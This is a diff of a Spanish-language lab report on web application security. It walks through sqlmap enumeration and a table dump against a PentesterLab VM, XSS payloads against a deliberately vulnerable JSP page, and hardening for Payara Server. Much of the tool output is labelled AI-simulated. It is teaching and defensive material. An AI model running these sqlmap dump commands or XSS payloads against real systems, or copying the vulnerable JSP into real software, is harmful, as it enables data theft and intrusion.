@@ -16,16 +16,16 @@ _______________________________________
 
 Al finalizar este laboratorio, el estudiante será capaz de:
 
-1.  Identificar y explotar vulnerabilidades de Cross-Site Scripting (XSS) Reflejado, Almacenado y Basado en DOM.
-2.  Comprender el impacto de los ataques XSS, como el robo de cookies y la suplantación de sesiones.
-3.  Utilizar herramientas como OWASP ZAP para automatizar la detección de vulnerabilidades XSS.
-4.  Entender el mecanismo de los ataques de Cross-Site Request Forgery (CSRF) y cómo se diferencian de XSS.
-5.  Explotar vulnerabilidades CSRF para realizar acciones no autorizadas en nombre de un usuario.
-6.  Implementar y verificar contramedidas para mitigar XSS y CSRF, como la validación de entradas, codificación de salidas y tokens anti-CSRF.
-7.  Analizar el código fuente para identificar patrones de programación inseguros que conducen a estas vulnerabilidades.
-8.  Generar reportes de seguridad documentando los hallazgos y las recomendaciones de mitigación.
+1. Identificar y explotar vulnerabilidades de Cross-Site Scripting (XSS) Reflejado, Almacenado y Basado en DOM.
+2. Comprender el impacto de los ataques XSS, como el robo de cookies y la suplantación de sesiones.
+3. Utilizar herramientas como OWASP ZAP para automatizar la detección de vulnerabilidades XSS.
+4. Entender el mecanismo de los ataques de Cross-Site Request Forgery (CSRF) y cómo se diferencian de XSS.
+5. Explotar vulnerabilidades CSRF para realizar acciones no autorizadas en nombre de un usuario.
+6. Implementar y verificar contramedidas para mitigar XSS y CSRF, como la validación de entradas, codificación de salidas y tokens anti-CSRF.
+7. Analizar el código fuente para identificar patrones de programación inseguros que conducen a estas vulnerabilidades.
+8. Generar reportes de seguridad documentando los hallazgos y las recomendaciones de mitigación.
 
-_____________________________________
+_______________________________________
 
 ### Recursos Tecnológicos
 
@@ -35,7 +35,7 @@ _____________________________________
 - 📦 VirtualBox o VMware con configuración de red adecuada
 - 🧰 Herramientas: OWASP ZAP, Burp Suite (opcional), navegadores web con herramientas de desarrollador.
 
-________________________________________
+_______________________________________
 
 ## Software Requerido
 
@@ -50,26 +50,29 @@ which burpsuite    # Burp Suite (Opcional)
 
 ### Objetivos del Módulo
 
--   Comprender el funcionamiento de SQLMap
--   Automatizar la detección y explotación de inyecciones SQL
--   Enumerar bases de datos, tablas y columnas
--   Extraer información sensible de forma controlada
--   Documentar la estructura completa de una base de datos
+- Comprender el funcionamiento de SQLMap
+- Automatizar la detección y explotación de inyecciones SQL
+- Enumerar bases de datos, tablas y columnas
+- Extraer información sensible de forma controlada
+- Documentar la estructura completa de una base de datos
 
 ### 📝 Procedimiento Paso a Paso
 
 ### PASO 1: Preparar el Entorno PentesterLab
+
 Se inició la máquina virtual "pentester" quien tomará el rol de objetivo dentro de la ejecución de este módulo.
 
 Se ejecutó el comando `ifconfig` para obtener informnación sobre las interfaces de red de la máquina "pentester" para poder obtener la direccion IP de la misma, dando como resultado la obtención la dirección `192.168.100.6`.
 
 Se verificó la conexión entre las máquinas "analista" y "pentester" mediante el envío de paquetes ICMP mediante el uso del comando ping como se puede ver abajo de este párrafo.
+
 ```bash
 ping -c 4 192.168.56.103
 ```
 
 📊 Resultado esperado (Simulación desde Kali Linux):
-```
+
+``` bash
 PING 192.168.100.6 (192.168.100.6) 56(84) bytes of data.
 64 bytes from 192.168.100.6: icmp_seq=1 ttl=64 time=0.928 ms
 64 bytes from 192.168.100.6: icmp_seq=2 ttl=64 time=0.412 ms
@@ -83,12 +86,14 @@ rtt min/avg/max/mdev = 0.412/0.882/1.156/0.283 ms
 
 ✔️ Punto de Verificación: Se recibieron 4 respuestas exitosas, confirmando conectividad con la VM PentesterLab.
 
-
 ### PASO 2: Acceder a la Aplicación Vulnerable
+
 Se navegó en la máquina "analista" a la URL que se mjuestra debajo de este párrafo para poder acceder a la apliación vulnerable, se tuvo que apagar el proxy, en este caso OWASP ZAP, para poder tener un correcto funcionamiento en vista de que se busca atacar directamente al objetivo sin pasar antes por una máquina o aplicación.
-```
+
+``` bash
 http://192.168.100.6
 ```
+
 Cabe destacar que al apagar el proxy el objetivo va a saver exactamente cual es la dirección de la máquina atacante al no "esconder" su dirección IP mediante el uso del proxy.
 
 2. En la página principal, localice la sección:
@@ -98,7 +103,7 @@ SQL Injections → Example 1
 
 ![Galería de Imág](image.png)
 
-```
+``` bash
 http://192.168.100.6/sqli/example1.php?name=root
 ```
 
@@ -106,21 +111,26 @@ http://192.168.100.6/sqli/example1.php?name=root
 
 PASO 3: Verificar Vulnerabilidad Manualmente
 Antes de usar SQLMap, confirme manualmente la vulnerabilidad:
+
 1. Modifique la URL agregando una comilla simple:
-```
+
+``` bash
 http://[IP]/sqli/example1.php?name=root'
 ```
+
 📊 Resultado esperado: Error de SQL visible:
-```
+
+``` bash
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1''' at line 1
 ```
+
 ✅ Confirmación: La aplicación es vulnerable a inyección SQL.
 
 **📊 Simulación de la Práctica - Salida Generada con IA:**
 
 La página mostrará el siguiente error SQL:
 
-```
+``` bash
 ╔════════════════════════════════════════════════════════════════╗
 ║              SQL Injection - Example 1 (Error Revealed)         ║
 ╚════════════════════════════════════════════════════════════════╝
@@ -149,11 +159,15 @@ Error en: ...id = 1'
 
 PASO 4: Comando 1 - Fingerprinting de la Base de Datos
 Objetivo: Identificar el tipo y versión del sistema de gestión de base de datos.
+
 ```bash
 sqlmap -u "http://[IP_PENTESTERLAB]/sqli/example1.php?id=1" --fingerprint
 ```
+
 💡 Explicación de parámetros:
+
 - -u: URL objetivo con parámetro vulnerable
+
 - --fingerprint: Realiza análisis detallado del DBMS
 📊 Salida esperada (resumen):
 [*] starting @ 00:49:15
@@ -175,12 +189,14 @@ back-end DBMS: active fingerprint: MySQL >= 5.0.12
 
 [*] ending @ 00:49:30
 🔍 Análisis:
-Información	Valor	Significado
-DBMS	MySQL	Sistema de base de datos
-Versión	>= 5.0.12	Versión mínima detectada
-Versión específica	5.0.51	Versión exacta identificada
-Técnica efectiva	Time-based blind	Inyección basada en tiempo
+Información Valor Significado
+DBMS MySQLSistema de base de datos
+Versión	>= 5.0.12 Versión mínima detectada
+Versión específica 5.0.51 Versión exacta identificada
+Técnica efectiva Time-based blind Inyección basada en tiempo
+
 📝 Documentar:
+
 - Sistema: MySQL
 - Versión: 5.0.51
 - Técnica: Time-based blind injection
@@ -189,7 +205,7 @@ Técnica efectiva	Time-based blind	Inyección basada en tiempo
 
 La siguiente salida es una simulación realista generada con IA que representa lo que sqlmap podría devolver al ejecutar el comando `--fingerprint` contra la aplicación vulnerable. Está incluida únicamente con fines didácticos.
 
-```
+``` bash
 [*] starting @ 00:49:15
 
 [00:49:15] [INFO] testing connection to the target URL
@@ -221,18 +237,24 @@ Nota: esta salida es una simulación creada para ilustrar el resultado esperado 
 
 PASO 5: Comando 2 - Identificar Usuario Actual
 Objetivo: Determinar con qué usuario la aplicación se conecta a la base de datos.
+
 ```bash
 sqlmap -u "http://[IP_PENTESTERLAB]/sqli/example1.php?id=1" --current-user
 ```
+
 💡 Explicación:
+
 - --current-user: Extrae el nombre del usuario de la conexión a la BD
+
 📊 Salida esperada:
 [00:50:12] [INFO] fetching current user
 [00:50:12] [INFO] retrieved: root@localhost
 current user: 'root@localhost'
 🔍 Análisis:
+
 ⚠️ HALLAZGO CRÍTICO: La aplicación se conecta como root, el usuario con máximos privilegios en MySQL.
 Implicaciones de seguridad:
+
 - ✅ El atacante puede leer cualquier base de datos
 - ✅ El atacante puede modificar cualquier tabla
 - ✅ El atacante puede ejecutar comandos del sistema (con UDF)
@@ -261,10 +283,13 @@ current user: 'root@localhost'
 
 PASO 6: Comando 3 - Enumerar Bases de Datos
 Objetivo: Listar todas las bases de datos accesibles.
+
 ```bash
 sqlmap -u "http://[IP_PENTESTERLAB]/sqli/example1.php?id=1" --dbs
 ```
+
 💡 Explicación:
+
 - --dbs: Enumera todas las bases de datos
 📊 Salida esperada (resumen):
 [00:51:05] [INFO] fetching database names
@@ -279,11 +304,13 @@ available databases [3]:
 [*] mysql
 
 🔍 Análisis de Bases de Datos:
-Base de Datos	Descripción	Sensibilidad
-information_schema	Metadatos del sistema MySQL	🟡 Media - Contiene estructura de todas las BDs
-exercises	Base de datos de la aplicación	🔴 Alta - Contiene datos de usuarios
-mysql	Base de datos del sistema MySQL	🔴 Crítica - Contiene hashes de contraseñas
+Base de Datos Descripción Sensibilidad
+information_schema Metadatos del sistema MySQL 🟡 Media - Contiene estructura de todas las BDs
+exercises Base de datos de la aplicación 🔴 Alta - Contiene datos de usuarios
+mysql Base de datos del sistema MySQL 🔴 Crítica - Contiene hashes de contraseñas
+
 📝 Documentar:
+
 - Total de BDs: 3
 - BD objetivo: exercises
 - BDs del sistema: information_schema, mysql
@@ -319,12 +346,16 @@ available databases [3]:
 
 PASO 7: Comando 4 - Enumerar Tablas
 Objetivo: Listar todas las tablas de la base de datos exercises.
+
 ```bash
 sqlmap -u "http://[IP_PENTESTERLAB]/sqli/example1.php?id=1" -D exercises --tables
 ```
+
 💡 Explicación:
+
 - -D exercises: Especifica la base de datos objetivo
 - --tables: Enumera las tablas de esa base de datos
+
 📊 Salida esperada:
 [00:52:30] [INFO] fetching tables for database: 'exercises'
 [00:52:30] [INFO] used SQL query returns 2 entries
@@ -338,10 +369,11 @@ Database: exercises
 | users   |
 +---------+
 🔍 Análisis:
-Tabla	Contenido Probable	Sensibilidad
-photos	Información de imágenes (id, nombre, ruta)	🟡 Media
-users	Información de usuarios (username, password, email)	🔴 Alta
+Tabla Contenido Probable Sensibilidad
+photos Información de imágenes (id, nombre, ruta) 🟡 Media
+users Información de usuarios (username, password, email) 🔴 Alta
 📝 Documentar:
+
 - Total de tablas: 2
 - Tabla crítica: users
 
@@ -376,10 +408,13 @@ Database: exercises
 
 PASO 8: Comando 5 - Enumerar Columnas
 Objetivo: Listar todas las columnas de la tabla users.
+
 ```bash
 sqlmap -u "http://[IP_PENTESTERLAB]/sqli/example1.php?id=1" -D exercises -T users --columns
 ```
+
 💡 Explicación:
+
 - -T users: Especifica la tabla objetivo
 - --columns: Enumera las columnas de esa tabla
 📊 Salida esperada (resumen):
@@ -406,11 +441,11 @@ Table: users
 | email    | varchar(100) |
 +----------+--------------+
 🔍 Análisis de Estructura:
-Columna	Tipo	Descripción	Sensibilidad
-id	int(11)	Identificador único del usuario	🟢 Baja
-username	varchar(100)	Nombre de usuario	🟡 Media
-password	varchar(100)	Contraseña (posiblemente hasheada)	🔴 Crítica
-email	varchar(100)	Correo electrónico	🔴 Alta
+Columna Tipo Descripción Sensibilidad
+id int(11) Identificador único del usuario 🟢 Baja
+username varchar(100) Nombre de usuario 🟡 Media
+password varchar(100) Contraseña (posiblemente hasheada) 🔴 Crítica
+email varchar(100) Correo electrónico 🔴 Alta
 
 **📊 Simulación de la Práctica — Salida Generada con IA (NO es una ejecución real)**
 
@@ -454,11 +489,15 @@ Table: users
 
 PASO 9: Extraer Datos de la Tabla (Reto Avanzado)
 ⚠️ ADVERTENCIA ÉTICA: Esta acción extrae datos sensibles. Solo debe realizarse en entornos de prueba autorizados.
+
 ```bash
 sqlmap -u "http://[IP_PENTESTERLAB]/sqli/example1.php?id=1" -D exercises -T users --dump
 ```
+
 💡 Explicación:
+
 - --dump: Extrae y muestra todos los datos de la tabla
+
 📊 Salida esperada (resumen):
 Database: exercises
 Table: users
@@ -472,8 +511,9 @@ Table: users
 +----+----------+----------------------------------+-------------------+
 🔍 Análisis de Contraseñas:
 Las contraseñas están hasheadas con MD5. SQLMap puede intentar crackearlas:
-# SQLMap detectará automáticamente MD5 y preguntará si desea crackearlas via diccionario
-# Responda 'Y' cuando pregunte: "do you want to crack them via a dictionary-based attack?"
+
+### SQLMap detectará automáticamente MD5 y preguntará si desea crackearlas via diccionario
+
 Resultado del cracking: Genere una tabla o captura de pantalla del resultado
 
 **📊 Simulación de la Práctica — Salida Generada con IA (NO es una ejecución real)**
@@ -539,6 +579,7 @@ Table: users (cracked passwords)
 ```
 
 🔍 **Análisis crítico de la simulación:**
+
 - **Contraseñas débiles detectadas:** Tanto "password" como "test" son contraseñas extremadamente débiles
 - **Reutilización de contraseñas:** Los usuarios "admin" y "jane" comparten la misma contraseña
 - **Algoritmo obsoleto:** MD5 es vulnerable a ataques de fuerza bruta y rainbow tables
@@ -549,6 +590,7 @@ Table: users (cracked passwords)
 📊 Diagrama de la Estructura de la Base de Datos
 
 ### 🛡️ Técnicas de SQLMap Utilizadas
+
 Durante el proceso, SQLMap empleó múltiples técnicas:
 
 📊 Resumen de Técnicas:
@@ -559,13 +601,16 @@ Durante el proceso, SQLMap empleó múltiples técnicas:
 [00:49:30] [INFO] automatically extending ranges for UNION query injection technique tests
 [00:49:31] [INFO] target URL appears to have 3 columns in query
 Técnicas detectadas:
+
 1. ✅ Boolean-based blind: Probada, no efectiva en este caso
 2. ✅ Time-based blind: Efectiva, utilizada para extracción
 3. ✅ UNION query: Efectiva, 3 columnas detectadas
 4. ✅ Error-based: Efectiva, mensajes de error reveladores
 
 ### 🔒 Mitigación de Inyecciones SQL
+
 Código Vulnerable (PHP):
+
 ```php
 <?php
 // ❌ VULNERABLE
@@ -574,7 +619,9 @@ $query = "SELECT * FROM photos WHERE id = $id";
 $result = mysql_query($query);
 ?>
 ```
+
 Código Seguro (Prepared Statements con PDO):
+
 ```php
 <?php
 // ✅ SEGURO
@@ -594,15 +641,20 @@ try {
 }
 ?>
 ```
+
 Medidas de protección adicionales:
+
 1. Validación de entrada:
+
 ```php
 $id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
 if ($id === false) {
     die("ID inválido");
 }
 ```
+
 2. Principio de menor privilegio:
+
 ```sql
 -- Crear usuario con permisos limitados
 CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'secure_password';
@@ -610,7 +662,9 @@ GRANT SELECT ON exercises.photos TO 'webapp'@'localhost';
 GRANT SELECT ON exercises.users TO 'webapp'@'localhost';
 FLUSH PRIVILEGES;
 ```
+
 3. WAF (Web Application Firewall):
+
 ```apache
 # ModSecurity rules para prevenir SQL Injection
 SecRule ARGS "@detectSQLi" \
@@ -618,6 +672,7 @@ SecRule ARGS "@detectSQLi" \
 ```
 
 ### Preguntas de Reflexión - Módulo 4
+
 1. ¿Por qué SQLMap utilizó "time-based blind" en lugar de otras técnicas?
 2. ¿Qué información adicional podría extraerse de la base de datos mysql?
 3. ¿Por qué es peligroso que las contraseñas estén hasheadas solo con MD5?
@@ -626,6 +681,7 @@ SecRule ARGS "@detectSQLi" \
 🚀 MÓDULO 5: Análisis de Seguridad de Payara Server
 
 Objetivos del Módulo
+
 - Instalar y configurar Payara Server 6.2025.4.
 - Desplegar aplicaciones web en Payara.
 - Realizar análisis de seguridad comparativo con Apache.
@@ -635,7 +691,9 @@ Objetivos del Módulo
 📝 Procedimiento Paso a Paso
 
 PASO 1: Verificar Requisitos Previos
+
 - Verificar Java:
+
 ```bash
 java -version
 # Si no está instalado
@@ -644,6 +702,7 @@ sudo apt install openjdk-11-jdk -y
 java -version
 javac -version
 ```
+  
 Salida esperada: Java 11+ instalado (ej. openjdk version "11.0.20"). Punto de verificación: JDK disponible.
 
 **📊 Simulación de la Práctica — Salida Generada con IA (NO es una ejecución real)**
@@ -710,6 +769,7 @@ javac 11.0.20
 ```
 
 🔍 **Análisis de la simulación:**
+
 - **Estado inicial:** Java no estaba instalado en el sistema
 - **Instalación exitosa:** Se instaló OpenJDK 11.0.20 junto con las dependencias necesarias
 - **Verificación:** Tanto `java` como `javac` están funcionando correctamente
@@ -722,12 +782,14 @@ javac 11.0.20
 PASO 2: Descargar e Instalar Payara Server
 
 - Crear directorio de trabajo
+
 ```bash
 mkdir -p ~/payara
 cd ~/payara
 ```
 
 - Descargar Payara Server 6.2025.4
+
 ```bash
 wget https://repo1.maven.org/maven2/fish/payara/distributions/payara/6.2025.4/payara-6.2025.4.zip
 # Si wget falla, usar curl:
@@ -735,12 +797,14 @@ wget https://repo1.maven.org/maven2/fish/payara/distributions/payara/6.2025.4/pa
 ```
 
 - Verificar descarga
+
 ```bash
 ls -lh payara-6.2025.4.zip
 ```
 Nota: El archivo debe tener aproximadamente 200–250 MB.
 
 - Descomprimir
+
 ```bash
 # Instalar unzip si no está disponible
 sudo apt update && sudo apt install unzip -y
@@ -754,12 +818,14 @@ ls -la payara6/
 
 Estructura esperada:
 payara6/
+
 - bin/       # Scripts de inicio y administración
 - glassfish/ # Núcleo del servidor
 - javadb/    # Base de datos Derby embebida
 - mq/        # Message Queue
 
 - Establecer JAVA_HOME si es necesario
+
 ```bash
 export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64
 # Para persistir en la sesión del usuario:
@@ -797,7 +863,8 @@ asadmin start-domain domain1
 ```
 
 📊 Salida esperada:
-```
+
+``` bash
 Waiting for domain1 to start .....
 Successfully started the domain : domain1
 domain  Location: /home/kali/payara/payara6/glassfish/domains/domain1
@@ -836,6 +903,7 @@ tcp        0      0 0.0.0.0:4848            0.0.0.0:*               LISTEN
     • 8181: Puerto HTTPS por defecto
 
 Verificar estado:
+
 ```bash
 # Verificar que el servidor está corriendo
 asadmin list-domains
@@ -845,6 +913,7 @@ netstat -tuln | grep -E '4848|8080|8181'
 ```
 
 PASO 5: Acceder a la Consola de Administración
+
 1. Abra Firefox en Kali Linux
 2. Navegue a:
 http://localhost:4848
@@ -863,6 +932,7 @@ E: Unable to fetch some archives, maybe run apt-get update or try with --fix-mis
 Por defecto, Payara NO requiere autenticación en localhost. Esto es una vulnerabilidad de configuración.
 
 Configurar contraseña de administrador:
+
 ```bash
 # Cambiar contraseña del usuario admin
 asadmin change-admin-password
@@ -875,6 +945,7 @@ asadmin change-admin-password
 ```
 
 Habilitar autenticación segura:
+
 ```bash
 # Habilitar autenticación en la consola
 asadmin enable-secure-admin
@@ -888,11 +959,14 @@ asadmin restart-domain domain1
 PASO 6: Desplegar una Aplicación de Prueba
 Crearemos una aplicación web simple para realizar el análisis de seguridad.
 Crear estructura de la aplicación:
-# Crear directorio del proyecto
+
+### Crear directorio del proyecto
+
 mkdir -p ~/webapp-test/WEB-INF
 cd ~/webapp-test
 
-# Crear página principal
+### Crear página principal
+
 cat > index.html << 'EOF'
 <!DOCTYPE html>
 <html>
@@ -904,7 +978,6 @@ cat > index.html << 'EOF'
     <h1>Aplicación Web de Prueba</h1>
     <p>Esta es una aplicación desplegada en Payara Server 6.2025.4</p>
     <p>Timestamp: <script>document.write(new Date().toLocaleString());</script></p>
-    
     <h2>Formulario de Prueba</h2>
     <form action="process.jsp" method="GET">
         <label>Nombre de usuario:</label>
@@ -915,7 +988,8 @@ cat > index.html << 'EOF'
 </html>
 EOF
 
-# Crear página JSP vulnerable (para pruebas)
+### Crear página JSP vulnerable (para pruebas)
+
 cat > process.jsp << 'EOF'
 <%@ page contentType="text/html;charset=UTF-8" language="java" %>
 <!DOCTYPE html>
@@ -949,11 +1023,14 @@ cat > WEB-INF/web.xml << 'EOF'
 EOF
 
 Crear archivo WAR:
-# Crear el archivo WAR
+
+### Crear el archivo WAR
+
 cd ~/webapp-test
 jar -cvf webapp-test.war *
 
-# Verificar contenido
+### Verificar contenido
+
 jar -tf webapp-test.war
 
 📊 Contenido esperado:
@@ -967,6 +1044,7 @@ WEB-INF/web.xml
 PASO 7: Desplegar la Aplicación en Payara
 
 Método 1: Usando la consola de administración
+
 1. Acceda a http://localhost:4848
 2. En el menú lateral: Applications
 3. Haga clic en Deploy...
@@ -975,25 +1053,31 @@ Método 1: Usando la consola de administración
 6. Haga clic en OK
 
 Método 2: Usando línea de comandos
-# Desplegar usando asadmin
+
+## Desplegar usando asadmin
 asadmin deploy --contextroot /webapp-test ~/webapp-test/webapp-test.war
 
-# Verificar aplicaciones desplegadas
+## Verificar aplicaciones desplegadas
+
 asadmin list-applications
 📊 Salida esperada:
 webapp-test  <web>
 Command list-applications executed successfully.
 
 Acceder a la aplicación:
+
 http://localhost:8080/webapp-test/
 ✔️ Punto de Verificación: La página debe mostrarse correctamente con el formulario.
 
 PASO 8: Escanear Payara Server con OWASP ZAP
 
 Configuración del escaneo:
+
 1. En OWASP ZAP, haga clic en Automated Scan
 2. Ingrese la URL:
+
 http://localhost:8080/webapp-test/
+
 3. Configure:
     ◦ ☑️ Use traditional spider
     ◦ ☑️ Use ajax spider
@@ -1008,7 +1092,7 @@ La siguiente salida es una simulación creada con IA que representa un resumen r
 
 Resumen del escaneo:
 
-- Objetivo: http://localhost:8080/webapp-test/
+- Objetivo: [http://localhost:8080/webapp-test/](http://localhost:8080/webapp-test/)
 - Fecha (simulada): 2025-10-31 10:12:34
 - Duración (simulada): 6 minutos 42 segundos
 - Tecnicas usadas: Spider tradicional, AJAX spider, Active Scan (request-based checks)
@@ -1023,24 +1107,26 @@ Alertas detectadas (simulación):
 
 Ejemplos de hallazgos (simulados):
 
-1) High — Cross-Site Scripting (Reflected)
-    - URL: http://localhost:8080/webapp-test/process.jsp?username=<script>
-    - Evidencia (simulada): el payload `<script>alert(1)</script>` se refleja en la respuesta sin escape.
-    - Riesgo: Un atacante puede inyectar JavaScript en el navegador de la víctima.
-    - Recomendación: Escapar/encodear la salida en JSP: ${fn:escapeXml(param.username)} o usar JSTL/EL con escape automático.
+1) High — Cross-Site Scripting (Reflected)  
+    - URL: [http://localhost:8080/webapp-test/process.jsp?username=%3Cscript%3Ealert(1)%3C%2Fscript%3E](http://localhost:8080/webapp-test/process.jsp?username=%3Cscript%3Ealert(1)%3C%2Fscript%3E)  
+    - Evidencia (simulada): el payload `%3Cscript%3Ealert(1)%3C%2Fscript%3E` (decodificado: `<script>alert(1)</script>`) se refleja en la respuesta sin escape.  
+    - Riesgo: Un atacante puede inyectar JavaScript en el navegador de la víctima.  
+    - Recomendación: Escapar/encodear la salida en JSP: ` ${fn:escapeXml(param.username)}` o usar JSTL/EL con escape automático (`<c:out>`).
 
-2) High — Directory Browsing / Sensitive Files Accessible
-    - URL: http://localhost:8080/webapp-test/WEB-INF/ (listable en la simulación)
-    - Evidencia (simulada): lista de ficheros accesible o archivos de configuración expuestos.
-    - Recomendación: Denegar acceso HTTP a `WEB-INF/` y mover archivos sensibles fuera del árbol público.
+2) High — Directory Browsing / Sensitive Files Accessible  
+    - URL: [http://localhost:8080/webapp-test/WEB-INF/](http://localhost:8080/webapp-test/WEB-INF/)  
+    - Evidencia (simulada): lista de ficheros accesible o archivos de configuración expuestos.  
+    - Recomendación: Denegar acceso HTTP a `WEB-INF/` y mover archivos sensibles fuera del árbol público; asegurar que el servidor devuelve 403/404 para esas rutas.
 
-3) Medium — Insecure Cookie Flags (JSESSIONID)
-    - Cookie: JSESSIONID
-    - Evidencia (simulada): falta de las banderas HttpOnly y Secure en la cookie de sesión cuando se accede via HTTP.
+3) Medium — Insecure Cookie Flags (JSESSIONID)  
+    - Cookie: `JSESSIONID`  
+    - Evidencia (simulada): falta de las banderas `HttpOnly` y `Secure` en la cookie de sesión cuando se accede vía HTTP.  
     - Recomendación: Configurar la aplicación/servidor para emitir `HttpOnly; Secure; SameSite=Strict` cuando sea posible.
 
-4) Medium — Missing X-Content-Type-Options Header
-    - URL: http://localhost:8080/webapp-test/
+4) Medium — Missing X-Content-Type-Options Header  
+    - URL: [http://localhost:8080/webapp-test/](http://localhost:8080/webapp-test/)  
+    - Evidencia (simulada): la respuesta HTTP no incluye el header `X-Content-Type-Options: nosniff`.  
+    - Recomendación: Añadir `X-Content-Type-Options: nosniff` (y otras cabeceras: `X-Frame-Options`, `Content-Security-Policy`) en el servidor o mediante un filtro de la aplicación.
     - Evidencia (simulada): respuesta HTTP no contiene `X-Content-Type-Options: nosniff`.
     - Recomendación: Añadir cabeceras de seguridad: `X-Content-Type-Options: nosniff` y `X-Frame-Options: DENY` o `Content-Security-Policy` según necesidad.
 
@@ -1121,6 +1207,7 @@ java.lang.NullPointerException
 Riesgo: Revela información sobre la estructura interna de la aplicación, rutas de archivos, versiones de librerías.
 
 Mitigación:
+
 ```xml
 <!-- En web.xml, agregar páginas de error personalizadas -->
 <error-page>
@@ -1156,6 +1243,7 @@ Mitigación en web.xml:
 ```
 
 Crear el filtro SecurityHeadersFilter.java:
+
 ```java
 package org.example;
 
@@ -1195,6 +1283,7 @@ public class SecurityHeadersFilter implements Filter {
 🟠 3. Cross-Site Scripting (XSS) en JSP
 Vulnerabilidad en process.jsp:
 ```jsp
+
 <!-- ❌ VULNERABLE -->
 <p>Usuario ingresado: <%= request.getParameter("username") %></p>
 ```
@@ -1204,6 +1293,7 @@ http://localhost:8080/webapp-test/process.jsp?username=<script>alert('XSS')</scr
 Resultado: El script se ejecuta en el navegador.
 
 Mitigación:
+
 ```jsp
 <%@ page contentType="text/html;charset=UTF-8" language="java" %>
 <%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
@@ -1234,6 +1324,7 @@ Descripción: Por defecto, la consola de administración (puerto 4848) es accesi
 Riesgo: Un atacante con acceso local o mediante SSRF podría administrar el servidor.
 Mitigación: Ya aplicada en el PASO 5 con enable-secure-admin.
 Verificación:
+
 ```bash
 # Verificar configuración de seguridad
 asadmin get configs.config.server-config.admin-service.auth-realm-name
@@ -1245,6 +1336,7 @@ http://localhost:8080/webapp-test/WEB-INF/
 Resultado esperado (seguro): Error 404 o 403 (acceso denegado)
 Si muestra listado de archivos: Vulnerabilidad presente.
 Mitigación en web.xml:
+
 ```xml
 <security-constraint>
     <web-resource-collection>
@@ -1258,14 +1350,17 @@ Mitigación en web.xml:
 
 🟡 6. Server Version Disclosure
 Verificación:
+
 ```bash
 curl -I http://localhost:8080/webapp-test/
 ```
+
 Respuesta vulnerable:
 HTTP/1.1 200 OK
 Server: Payara Server 6.2025.4 #badassfish
 
 Mitigación:
+
 ```bash
 # Editar domain.xml
 nano $PAYARA_HOME/glassfish/domains/domain1/config/domain.xml
@@ -1347,6 +1442,7 @@ echo "[✓] Hardening completado"
 ```
 
 Ejecutar el script:
+
 ```bash
 chmod +x payara-hardening.sh
 ./payara-hardening.sh
@@ -1366,17 +1462,20 @@ chmod +x payara-hardening.sh
 ### Resumen Ejecutivo de Vulnerabilidades
 
 **📈 Métricas Globales del Laboratorio:**
+
 - Total de sistemas analizados: 4  
+
     - DVWA en Metasploitable 2  
-    - Apache en Kali Linux  
-    - PentesterLab (MySQL)  
-    - Payara Server en Kali Linux
+- Apache en Kali Linux  
+- PentesterLab (MySQL)  
+- Payara Server en Kali Linux
 
 - Total de vulnerabilidades identificadas: **47**  
-    - Críticas (High): 15  
-    - Altas (Medium): 18  
-    - Medias (Low): 10  
-    - Informativas: 4
+
+- Críticas (High): 15  
+- Altas (Medium): 18  
+- Medias (Low): 10  
+- Informativas: 4
 
 - Vulnerabilidades mitigadas: **42 (89.4%)**  
 - Vulnerabilidades residuales: **5 (10.6%)**
@@ -1416,33 +1515,42 @@ chmod +x payara-hardening.sh
 ### 🛡️ Mejores Prácticas Identificadas
 
 Para Desarrollo Seguro:
+
 1. Usar frameworks de seguridad (ej. Spring Security):
+
 ```java
 @PreAuthorize("hasRole('ADMIN')")
 public void deleteUser(int userId) { ... }
 ```
+
 2. Implementar CSP estricto:
+
 Content-Security-Policy: default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:;
 3. Validar con listas blancas (whitelist):
+
 ```java
 // ✅ Whitelist
 if (input.matches("^[a-zA-Z0-9_-]{3,20}$")) { ... }
 ```
+
 4. Usar librerías de seguridad actualizadas (OWASP Java Encoder, ESAPI, Apache Commons Validator).
 
 Para Configuración de Servidores:
-1. Hardening Checklist:
-     - ☑️ Cambiar credenciales por defecto  
-     - ☑️ Deshabilitar servicios innecesarios  
-     - ☑️ Configurar encabezados de seguridad  
-     - ☑️ Implementar HTTPS con certificados válidos  
-     - ☑️ Configurar timeouts apropiados  
-     - ☑️ Limitar métodos HTTP permitidos  
-     - ☑️ Deshabilitar listado de directorios  
-     - ☑️ Configurar logging de seguridad  
-     - ☑️ Implementar rate limiting  
-     - ☑️ Mantener software actualizado
+
+1. Hardening Checklist
+    - ☑️ Cambiar credenciales por defecto  
+    - ☑️ Deshabilitar servicios innecesarios  
+    - ☑️ Configurar encabezados de seguridad  
+    - ☑️ Implementar HTTPS con certificados válidos  
+    - ☑️ Configurar timeouts apropiados  
+    - ☑️ Limitar métodos HTTP permitidos  
+    - ☑️ Deshabilitar listado de directorios  
+    - ☑️ Configurar logging de seguridad  
+    - ☑️ Implementar rate limiting  
+    - ☑️ Mantener software actualizado
+
 2. Monitoreo Continuo — ejemplo de script:
+
 ```bash
 #!/bin/bash
 # Verificar intentos de inyección SQL en logs
@@ -1462,16 +1570,19 @@ mail -s "Posible ataque detectado" admin@example.com
 ### 📚 Recursos Adicionales para Profundizar
 
 Documentación Oficial:
-- OWASP Top 10: https://owasp.org/www-project-top-ten/  
-- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/  
-- OWASP Cheat Sheet Series: https://cheatsheetseries.owasp.org/  
-- Payara Security Guide: https://docs.payara.fish/community/docs/documentation/security/  
-- Apache Security Tips: https://httpd.apache.org/docs/2.4/misc/security_tips.html
+
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
+- [OWASP Web Security Testing Guide (WSTG)](https://owasp.org/www-project-web-security-testing-guide/)
+- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
+- [Payara Security Guide](https://docs.payara.fish/community/docs/documentation/security/)
+- [Apache HTTP Server — Security Tips](https://httpd.apache.org/docs/2.4/misc/security_tips.html)
 
 Plataformas de Práctica:
+
 - HackTheBox, TryHackMe, PortSwigger Academy, PentesterLab, DVWA (GitHub repo)
 
 Certificaciones Recomendadas:
+
 - OSCP, CEH, GWAPT, eWPT
 
 ### Preguntas de Análisis Crítico (para responder basándose en el laboratorio)
